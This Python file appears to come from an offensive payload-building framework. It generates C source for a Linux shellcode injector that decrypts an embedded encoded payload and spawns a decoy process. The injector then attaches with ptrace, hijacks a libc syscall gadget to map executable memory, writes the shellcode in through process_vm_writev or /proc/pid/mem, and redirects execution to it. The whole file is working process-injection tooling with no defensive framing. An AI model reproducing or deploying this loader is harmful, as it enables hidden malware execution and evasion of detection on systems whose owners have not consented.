#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for /proc/pid/mem and process_vm_writev injection."""

from __future__ import annotations

from lib.compile.linux_injection_common import LinuxInjectionBuilder


class ProcMemInjectBuilder(LinuxInjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        target_cmd: str = "/bin/sleep 120",
        use_vm_writev: bool = True,
    ) -> str:
        cmd = target_cmd.replace("\\", "\\\\").replace('"', '\\"')
        write_fn = "vm_write_remote" if use_vm_writev else "proc_mem_write_remote"
        return f"""
{chr(10).join(self.headers())}
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

char* enc_payload = "{encoded_payload}";
char* target_cmd = "{cmd}";

#ifndef PTRACE_SYSCALL
#define PTRACE_SYSCALL 24
#endif

static unsigned long find_syscall_gadget(pid_t pid)
{{
    char path[256];
    char line[512];
    unsigned long start = 0, end = 0;
    FILE *maps;

    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    maps = fopen(path, "r");
    if (!maps) return 0;
    while (fgets(line, sizeof(line), maps)) {{
        if (strstr(line, "libc") && strstr(line, "r-xp")) {{
            if (sscanf(line, "%lx-%lx", &start, &end) == 2)
                break;
        }}
    }}
    fclose(maps);
    if (!start || end <= start) return 0;

    for (unsigned long addr = start; addr + 2 < end; addr++) {{
        errno = 0;
        long word = ptrace(PTRACE_PEEKTEXT, pid, (void *)addr, NULL);
        if (errno) continue;
        if ((word & 0xffffff) == 0xc3050f)
            return addr;
    }}
    return 0;
}}

static long remote_syscall6_attached(pid_t pid, struct user_regs_struct *saved,
    long nr, unsigned long a0, unsigned long a1, unsigned long a2,
    unsigned long a3, unsigned long a4, unsigned long a5)
{{
    struct user_regs_struct regs;
    unsigned long gadget;
    int status;

    gadget = find_syscall_gadget(pid);
    if (!gadget) return -1;

    regs = *saved;
    regs.orig_rax = nr;
    regs.rax = nr;
    regs.rdi = a0;
    regs.rsi = a1;
    regs.rdx = a2;
    regs.r10 = a3;
    regs.r8 = a4;
    regs.r9 = a5;
    regs.rip = gadget;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
        return -1;
    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
        return -1;
    waitpid(pid, &status, 0);
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
        return -1;
    return (long)regs.rax;
}}

static unsigned long remote_mmap_attached(pid_t pid, struct user_regs_struct *saved, size_t len)
{{
    return (unsigned long)remote_syscall6_attached(
        pid, saved, 9, 0, len,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0);
}}

static int vm_write_remote(pid_t pid, unsigned long remote_addr,
    const unsigned char *data, size_t len)
{{
    struct iovec local = {{ .iov_base = (void *)data, .iov_len = len }};
    struct iovec remote = {{ .iov_base = (void *)remote_addr, .iov_len = len }};
    ssize_t n = process_vm_writev(pid, &local, 1, &remote, 1, 0);
    return (n == (ssize_t)len) ? 0 : -1;
}}

static int proc_mem_write_remote(pid_t pid, unsigned long remote_addr,
    const unsigned char *data, size_t len)
{{
    char path[64];
    int fd;
    ssize_t n;

    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    fd = open(path, O_RDWR);
    if (fd < 0) return -1;
    if (lseek(fd, (off_t)remote_addr, SEEK_SET) < 0) {{
        close(fd);
        return -1;
    }}
    n = write(fd, data, len);
    close(fd);
    return (n == (ssize_t)len) ? 0 : -1;
}}

static int inject_remote(pid_t pid, unsigned char *sc, size_t len)
{{
    struct user_regs_struct saved, regs;
    unsigned long remote_base;
    int status;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
        return -1;
    waitpid(pid, &status, 0);

    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved) < 0)
        goto fail;

    remote_base = remote_mmap_attached(pid, &saved, len);
    if (!remote_base || remote_base == (unsigned long)-1)
        goto fail;

    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    if ({write_fn}(pid, remote_base, sc, len) != 0)
        return -1;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
        return -1;
    waitpid(pid, &status, 0);
    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved) < 0)
        goto fail;

    regs = saved;
    regs.rip = remote_base;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
        goto fail;
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;

fail:
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return -1;
}}

static pid_t spawn_target(void)
{{
    pid_t pid = fork();
    if (pid == 0) {{
        execl("/bin/sh", "sh", "-c", target_cmd, (char *)NULL);
        _exit(127);
    }}
    return pid;
}}

int main(void)
{{
    pid_t target;
{self.decode_preamble()}
{self.decrypt_block(key, iv)}
    target = spawn_target();
    if (target < 0) return 1;
    usleep(200000);
    if (inject_remote(target, shellcode_buf, (size_t)payload_size) != 0) {{
        kill(target, SIGKILL);
        waitpid(target, NULL, 0);
        munmap(shellcode_buf, (size_t)payload_size);
        free(decoded);
        return 1;
    }}
    waitpid(target, NULL, 0);
{self.cleanup_block()}
    return 0;
}}
"""
